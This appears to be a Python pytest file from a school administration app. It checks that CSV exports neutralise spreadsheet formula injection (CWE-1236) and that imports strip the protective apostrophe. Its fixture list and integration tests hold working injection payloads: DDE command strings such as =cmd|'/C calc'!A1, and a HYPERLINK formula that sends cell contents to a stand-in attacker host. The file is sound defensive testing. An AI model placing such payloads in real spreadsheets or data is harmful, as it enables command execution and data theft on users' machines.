"""Формульные инъекции в CSV (CWE-1236): обезвреживание выгрузок и чистка импорта.

Проверяем два слоя:
  1. юнит — правила `cell()` / `clean_cell()` (что считается формулой, а что нет);
  2. интеграцию — реальные выгрузки SchoolHub и круг «экспорт → правка → импорт»,
     чтобы защитный апостроф не оседал в данных.
"""
from __future__ import annotations

import csv
import io
from datetime import date

import pytest

from app.csvsafe import cell, clean_cell, safe_writer
from tests.conftest import auth, upload

# --------------------------------------------------------------------------- #
#  Юнит: правила обезвреживания
# --------------------------------------------------------------------------- #

DANGEROUS = [
    '=HYPERLINK("http://evil.example/?c="&A1;"Открыть приказ")',
    "=cmd|'/C calc'!A1",
    "+1+1+cmd|'/C calc'!A1",
    "@SUM(1+1)*cmd|'/C calc'!A1",
    "\t=1+1",
    "\r=1+1",
    "   =1+1",                 # ведущие пробелы редакторы отбрасывают
    "-2+3+cmd|'/C calc'!A1",    # «минус», но не число
]

SAFE = [
    "Приказ о зачислении",
    "-5",
    "-1,5",
    "-1.5",
    "2025-2026 учебный год",
    "-50%",
    "Ноутбук Lenovo ThinkPad E14",
    "каб. 405; корпус Б",
    "",
]


def test_dangerous_cells_are_neutralised():
    for value in DANGEROUS:
        out = cell(value)
        assert out.startswith("'"), value
        # сам текст не искажается — только префикс
        assert out[1:] == value


def test_ordinary_values_are_untouched():
    for value in SAFE:
        assert cell(value) == value, value


def test_non_strings_pass_through():
    assert cell(None) is None
    assert cell(42) == 42
    assert cell(date(2026, 1, 15)) == date(2026, 1, 15)


def test_clean_cell_strips_junk_and_own_marker():
    assert clean_cell(None) == ""
    assert clean_cell("  Тема письма  ") == "Тема письма"
    assert clean_cell("\ufeffНаименование") == "Наименование"
    assert clean_cell("Имя\x00с\x1fсимволами") == "Имяссимволами"
    # наш защитный апостроф снимается, чтобы повторный импорт не накапливал «'»
    assert clean_cell("'=cmd|'/C calc'!A1") == "=cmd|'/C calc'!A1"
    # апостроф, который НЕ наш маркер, остаётся частью значения
    assert clean_cell("'quoted'") == "'quoted'"


def test_round_trip_export_then_import():
    """Выгрузили → загрузили обратно: значение не меняется и не обрастает апострофом."""
    for value in DANGEROUS + SAFE:
        assert clean_cell(cell(value)) == value.strip(), value


def test_safe_writer_wraps_every_cell():
    buf = io.StringIO()
    writer = safe_writer(buf, delimiter=";")
    writer.writerow(["Наименование", "=1+1", 7, None])
    text = buf.getvalue()
    assert text.split(";")[1].startswith("'")
    assert ";7;" in text
    # writerows — то же самое
    buf2 = io.StringIO()
    safe_writer(buf2, delimiter=";").writerows([["+2+2"], ["обычный"]])
    assert buf2.getvalue().startswith("'+2+2")


# --------------------------------------------------------------------------- #
#  Интеграция: реальные выгрузки
# --------------------------------------------------------------------------- #

@pytest.mark.asyncio
async def test_equipment_export_neutralises_formula_and_round_trips(client, seeded):
    owner = await auth(client, "owner@example.com")
    admin = await auth(client, "admin@example.com")
    await owner.patch(f"/users/{seeded['admin@example.com']}", json={"equipment_access": True})
    admin = await auth(client, "admin@example.com")

    evil = '=HYPERLINK("http://evil.example";"Журнал")'
    resp = await admin.post("/equipment", json={"name": evil, "inventory_number": "ИН-666", "quantity": 1})
    assert resp.status_code == 201, resp.text

    exported = await admin.get("/equipment/export.csv")
    assert exported.status_code == 200
    # разбираем файл как табличный процессор: опасная ячейка должна прийти с префиксом
    rows = list(csv.reader(io.StringIO(exported.text.lstrip("\ufeff")), delimiter=";"))
    row = next(r for r in rows if r and r[1] == "ИН-666")
    assert row[0] == f"'{evil}"

    # круг «выгрузили → загрузили обратно»: данные не должны обрасти апострофом
    result = (
        await admin.post("/equipment/import", files=upload("export.csv", exported.content, "text/csv"))
    ).json()
    assert result.get("updated", 0) >= 1, result
    listing = await admin.get("/equipment", params={"search": "ИН-666"})
    names = [i["name"] for i in listing.json()["items"]]
    assert evil in names, names


@pytest.mark.asyncio
async def test_incoming_export_neutralises_note(client, seeded):
    admin = await auth(client, "admin@example.com")
    owner = await auth(client, "owner@example.com")
    await owner.patch(f"/users/{seeded['admin@example.com']}", json={"incoming_journal_access": True})
    admin = await auth(client, "admin@example.com")

    resp = await admin.post(
        "/incoming",
        json={
            "incoming_number": "Вх-1",
            "subject": "Письмо о проверке",
            "sent_date": "2026-10-01",
            "note": "=cmd|'/C calc'!A1",
        },
    )
    assert resp.status_code in (200, 201), resp.text

    body = (await admin.get("/incoming/export.csv")).text
    rows = list(csv.reader(io.StringIO(body.lstrip("\ufeff")), delimiter=";"))
    row = next(r for r in rows if r and r[2] == "Вх-1")
    assert row[6] == "'=cmd|'/C calc'!A1"
